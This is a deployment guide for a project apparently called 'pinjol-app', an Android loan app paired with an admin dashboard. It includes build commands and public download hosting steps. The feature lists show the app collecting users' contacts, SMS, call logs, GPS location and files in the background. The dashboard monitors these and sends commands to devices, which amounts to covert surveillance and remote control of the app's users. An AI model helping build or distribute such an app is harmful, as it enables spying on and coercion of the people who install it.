# 📱 APK Deployment Guide

## 🎯 Overview
Project ini terdiri dari:
- **Backend**: Node.js API server
- **Frontend**: Vue.js Dashboard Admin
- **Mobile App**: Flutter APK untuk user

## 📁 Project Structure
```
/var/www/demo/
├── server/                 # Backend Node.js
├── dashboard-frontend/     # Vue.js Admin Dashboard
├── frontend/              # Flutter Mobile App
├── lib/                   # Flutter source code
├── main.py               # FastAPI backend (alternative)
└── build_apk.sh          # APK build script
```

## 🚀 Current Status

### ✅ **Backend & Dashboard (COMPLETED)**
- ✅ Node.js API server running on port 9000
- ✅ Vue.js dashboard accessible at https://d.seoikrom.com/dashboard
- ✅ All features implemented and working
- ✅ Docker containers running

### 🔄 **APK Deployment (IN PROGRESS)**

## 📱 Flutter APK Setup

### **Prerequisites Installed:**
- ✅ Flutter SDK: `/opt/flutter/`
- ✅ Java 17: OpenJDK 17
- ✅ Android SDK: `/opt/android-sdk/`
- ✅ Build tools: Available

### **APK Build Process:**

#### **Option 1: Manual Build**
```bash
cd /var/www/demo/frontend
export PATH="$PATH:/opt/flutter/bin"
export ANDROID_HOME=/opt/android-sdk
export JAVA_HOME=/usr/lib/jvm/java-17-openjdk-amd64

# Get dependencies
flutter pub get

# Build APK
flutter build apk --release
```

#### **Option 2: Using Build Script**
```bash
cd /var/www/demo
chmod +x build_apk.sh
./build_apk.sh
```

### **Expected APK Output:**
- **Location**: `/var/www/demo/frontend/build/app/outputs/flutter-apk/app-release.apk`
- **Copy to**: `/var/www/demo/pinjol-app.apk`

## 🌐 APK Distribution Options

### **Option 1: Direct Download**
```bash
# Make APK accessible via web
cp /var/www/demo/pinjol-app.apk /var/www/html/
# Access via: https://d.seoikrom.com/pinjol-app.apk
```

### **Option 2: Nginx File Server**
```nginx
# Add to nginx config
location /downloads/ {
    alias /var/www/demo/;
    autoindex on;
}
```

### **Option 3: Google Drive / Cloud Storage**
- Upload APK to Google Drive
- Share public download link
- Or use Firebase App Distribution

## 📋 APK Features

### **Mobile App Features:**
- ✅ User Registration & Login
- ✅ Product List & Details
- ✅ Payment Processing
- ✅ Background Services
- ✅ Permission Handling
- ✅ GPS & Contact Access
- ✅ SMS & Call Logs
- ✅ File Upload/Download

### **Admin Dashboard Integration:**
- ✅ Real-time user monitoring
- ✅ GPS tracking
- ✅ Contact management
- ✅ SMS monitoring
- ✅ Call log tracking
- ✅ File management
- ✅ Command sending

## 🔧 Troubleshooting

### **Common Issues:**

#### **1. Flutter Doctor Issues**
```bash
flutter doctor -v
# Fix missing dependencies
```

#### **2. Android SDK Issues**
```bash
# Reinstall Android SDK
cd /opt/android-sdk
sdkmanager --uninstall "platform-tools"
sdkmanager "platform-tools"
```

#### **3. Build Failures**
```bash
# Clean and rebuild
flutter clean
flutter pub get
flutter build apk --release
```

#### **4. Permission Issues**
```bash
# Fix file permissions
chmod -R 755 /var/www/demo/frontend
chown -R www-data:www-data /var/www/demo/frontend
```

## 📊 Deployment Checklist

### **Backend & Dashboard:**
- ✅ Docker containers running
- ✅ API endpoints working
- ✅ Dashboard accessible
- ✅ SSL certificate valid
- ✅ Database connected

### **APK Build:**
- ⏳ Flutter environment setup
- ⏳ Dependencies installed
- ⏳ APK built successfully
- ⏳ APK distributed
- ⏳ Download link available

### **Testing:**
- ⏳ APK installs correctly
- ⏳ App launches without errors
- ⏳ Features work as expected
- ⏳ Backend integration working
- ⏳ Admin dashboard monitoring

## 🎯 Next Steps

### **Immediate Actions:**
1. **Complete APK Build**
   ```bash
   cd /var/www/demo
   ./build_apk.sh
   ```

2. **Setup APK Distribution**
   ```bash
   # Make APK downloadable
   cp pinjol-app.apk /var/www/html/
   ```

3. **Test APK Installation**
   - Download APK to Android device
   - Install and test all features
   - Verify backend integration

4. **Documentation**
   - User manual for APK
   - Installation guide
   - Troubleshooting guide

## 📞 Support

### **For APK Issues:**
- Check Flutter logs: `flutter logs`
- Verify dependencies: `flutter pub deps`
- Test on different devices

### **For Backend Issues:**
- Check Docker logs: `docker-compose logs`
- Verify API endpoints: `curl https://d.seoikrom.com/api/`
- Check database connection

---

**Status**: Backend & Dashboard ✅ | APK Build 🔄  
**Last Updated**: August 3, 2025  
**Domain**: d.seoikrom.com  
**IP**: 31.97.109.207 